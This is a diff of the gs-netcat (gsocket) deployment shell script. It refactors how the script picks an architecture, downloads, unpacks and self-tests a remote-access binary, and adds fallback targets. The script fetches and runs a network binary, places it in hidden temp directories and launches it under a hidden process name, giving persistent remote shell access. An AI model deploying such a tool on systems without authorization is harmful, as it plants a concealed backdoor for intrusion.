@@ -75,25 +75,6 @@ exit_alldone()
 	exit_code 0
 }
 
-# Check if directory is writeable and bins can be executed from there
-# Does not work for busybox as /bin/sh is an applet
-# check_rwx_bin()
-# {
-# 	unset IS_DIR_WREX
-# 	local xdir
-# 	local xbin
-
-# 	xdir="$(dirname "$1")"
-# 	xbin="${xdir}/.gs-sh"
-
-# 	[[ -f "${xbin}" ]] || { cp /bin/sh "${xbin}"; chmod 700 "${xbin}"; }
-# 	echo foo
-
-# 	"${xbin}" -c true && IS_DIR_WREX=1
-# 	echo foo
-
-# }
-
 # Called _after_ init_vars() at the end of init_setup.
 init_dstbin()
 {
@@ -128,37 +109,39 @@ init_vars()
 	if [[ $OSTYPE == *linux* ]]; then 
 		if [[ x"$arch" == "xi686" ]]; then
 			if [[ $(uname -r) == *arch* ]]; then
-				SRC_PKG="gs-netcat_i686-arch.tar.gz"
+				OSARCH="i686-arch"
 			else
-				SRC_PKG="gs-netcat_i686-debian.tar.gz"
+				OSARCH="i686-debian"
 			fi
 		elif [[ x"$arch" == "xarmv6l" ]]; then
-			SRC_PKG="gs-netcat_armv6l-linux.tar.gz"
+			OSARCH="armv6l-linux"
 		else
 			if grep Arch /etc/issue &>/dev/null; then
-				SRC_PKG="gs-netcat_x86_64-arch.tar.gz"
+				OSARCH="x86_64-arch"
 			else
-				SRC_PKG="gs-netcat_x86_64-debian.tar.gz"
+				OSARCH="x86_64-debian"
 			fi
 		fi
 	elif [[ $OSTYPE == *darwin* ]]; then
-			SRC_PKG="gs-netcat_x86_64-osx.tar.gz"
+			OSARCH="x86_64-osx"
 	elif [[ $OSTYPE == *FreeBSD* ]]; then
-			SRC_PKG="gs-netcat_x86_64-freebsd.tar.gz"
+			OSARCH="x86_64-freebsd"
 	elif [[ $OSTYPE == *cygwin* ]]; then
-			SRC_PKG="gs-netcat_x86_64-cygwin.tar.gz"
+			OSARCH="x86_64-cygwin"
 	fi
 
 	if grep Alpine /etc/issue &>/dev/null; then
-		SRC_PKG="gs-netcat_x86_64-alpine.tar.gz"
+		OSARCH="x86_64-alpine"
 	fi
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_x86_64-debian.tar.gz" # Try debian 64bit as last resort
+	[[ -z "$SRC_PKG" ]] && OSARCH="x86_64-debian" # Try debian 64bit as last resort
 
 	if [[ -d /dev/shm ]]; then
 		TMPDIR="/dev/shm/.gs-${UID}"
 	elif [[ -d /tmp ]]; then
 		TMPDIR="/tmp/.gs-${UID}"
 	fi
+
+	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
 
 	# Docker does not set USER
 	[[ -z $USER ]] && USER=$(id -un)
@@ -179,7 +162,7 @@ init_vars()
 		KL_CMD_UARG="-u${USER}"
 	fi
 
-	# command -v "$KL_CMD" >/dev/null || WARM_OUT "No pkill or killall found."
+	command -v "$KL_CMD" >/dev/null || WARN "No pkill or killall found."
 	# command -v "$KL_CMD" >/dev/null || errexit "Need pkill or killall."
 
 	# Defaults
@@ -347,10 +330,16 @@ WARN()
 	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
 }
 
+WARN_EXECFAIL_SET()
+{
+	[[ -n $WARN_EXECFAIL_MSG ]] && return # set it once (first occurance) only
+	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+}
+
 WARN_EXECFAIL()
 {
 	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
-	echo -e 1>&2 "--> CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
 }
 
 gs_secret_reload()
@@ -536,7 +525,7 @@ dl()
 	if [[ -n "$GS_DEBUG" ]]; then
 		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
 		[[ -f "/gsocket-pkg/${1}" ]] && cp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
-		FAIL_OUT "GS_DEBUG set but deployment binaries not found..."
+		FAIL_OUT "GS_DEBUG set but deployment binaries not found (${1})..."
 		errexit
 	fi
 
@@ -561,7 +550,6 @@ gs_access()
 	local ret
 	GS_SECRET="${S}"
 
-	# "${TMPDIR}/gs-netcat" -s "${GS_SECRET}" -i
 	"${DSTBIN}" -s "${GS_SECRET}" -i
 	ret=$?
 	[[ $ret -eq 139 ]] && { EXECFAIL_OUT "$?" "SIGSEGV"; errexit; }
@@ -569,30 +557,94 @@ gs_access()
 	exit_code "$ret"
 }
 
-# binaries are in TMPDIR. Perform a functional test.
-# test_binaries <binary> <no_exec_test=1>
-test_binaries()
+# Binary is in an executeable directory (no noexec-flag)
+# set IS_TESTBIN_OK if binary worked.
+# test_bin <binary> <no_exec_test=1>
+test_bin()
 {
 	local bin
 	local no_exec_test
+	local err_log
+	unset IS_TESTBIN_OK
+
 	bin="$1"
 	no_exec_test="$2"
+
 	GS_SECRET=$("$bin" -g)
-	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "wrong binary"; errexit; }
+	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$?" "wrong binary"; return; }
 
-	# Only run exec test if installed with -l (not for gs_access)
-	[[ -n $no_exec_test ]] && return # no exec test (S= was specified)
-
-	# Connect to a random host to test binary, resolver and network connectivity.
-	local secret
-	secret=$("$bin" -g)
-	local log
-	log=$(GSOCKET_ARGS="-s selftest-${secret}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
-
+	err_log=$(GSOCKET_ARGS="-s selftest-${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
 	ret=$?
-	[[ $ret -eq 139 ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "SIGSEGV"; errexit; }
-	[[ $ret -ne 255 ]] && { FAIL_OUT; echo "$log"; errexit; }
+
+	[[ -z $ERR_LOG ]] && ERR_LOG="$err_log"
+	[[ $ret -eq 139 ]] && { FAIL_OUT; ERR_LOG=""; WARN_EXECFAIL_SET "$?" "SIGSEGV"; return; }
+	# Fail unless it's ECONNREFUSED
+	[[ $ret -ne 61 ]] && { FAIL_OUT; return; }
+
+	# exit code of gs-netcat was ECONNREFUSED. Thus connection to server
+	# was successfully and server replied that no client is listening. 
+	# This is a good enough test that this binary is working.
+	IS_TESTBIN_OK=1
 }
+
+# try <osarch> <is_with_warning>
+try()
+{
+	local osarch
+	local is_with_warning
+	local src_pkg
+	osarch="$1"
+	is_with_warning="$2"
+
+	src_pkg="gs-netcat_${osarch}.tar.gz"
+	echo -e 2>&1 "--> Trying ${CG}${osarch}${CN}"
+	# Download binaries
+	echo -en 2>&1 "Downloading binaries.................................................."
+	dl "gs-netcat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
+	OK_OUT
+
+	echo -en 2>&1 "Unpacking binaries...................................................."
+	# Unpack
+	(cd "${TMPDIR}" && tar xfz "${src_pkg}") || { FAIL_OUT "unpacking failed"; errexit; }
+	OK_OUT
+
+	echo -en 2>&1 "Copying binaries......................................................"
+	mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	chmod 700 "$DSTBIN"
+	OK_OUT
+
+	echo -en 2>&1 "Testing binaries......................................................"
+	test_bin "${DSTBIN}" "${S}"
+	if [[ -n $IS_TESTBIN_OK ]]; then
+		OK_OUT
+		return
+	fi
+
+	rm -f "${TMPDIR}/${src_pkg}"
+	[[ -z $is_with_warning ]] && return # silent return
+}
+
+# Download the gs-netcat_any-any.tar.gz and try all of the containing
+# binaries and fail hard if none could be found.
+try_any()
+{
+	targets="x86_64-debian i386-debian i686-arch x86_64-alpine i686-debian x86_64-centos"
+	for osarch in $targets; do
+		[[ x"$osarch" = x"$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
+		try "$osarch"
+		[[ -n $IS_TESTBIN_OK ]] && break
+	done
+
+
+	if [[ -n $IS_TESTBIN_OK ]]; then
+		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
+	else
+		[[ -n $ERR_LOG ]] && echo >&2 "$ERR_LOG"
+	fi
+	WARN_EXECFAIL
+	[[ -z $IS_TESTBIN_OK ]] && errexit "None of the binaries worked."
+}
+
 
 init_vars
 
@@ -601,24 +653,8 @@ init_vars
 
 init_setup
 
-# Download binaries
-echo -en 2>&1 "Downloading binaries.................................................."
-dl "$SRC_PKG" "${TMPDIR}/${SRC_PKG}"
-OK_OUT
-
-echo -en 2>&1 "Unpacking binaries...................................................."
-# Unpack
-(cd "${TMPDIR}" && tar xfz "${SRC_PKG}" && chmod 700 "${TMPDIR}/gs-netcat") || { FAIL_OUT "unpacking failed"; errexit; }
-OK_OUT
-
-echo -en 2>&1 "Copying binaries......................................................"
-mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
-chmod 700 "$DSTBIN"
-OK_OUT
-
-echo -en 2>&1 "Testing binaries......................................................"
-test_binaries "${DSTBIN}" "${S}" # Also sets GS_SECRET
-OK_OUT
+try "$OSARCH" 1
+[[ -z $IS_TESTBIN_OK ]] && try_any
 
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n $S ]] && gs_access
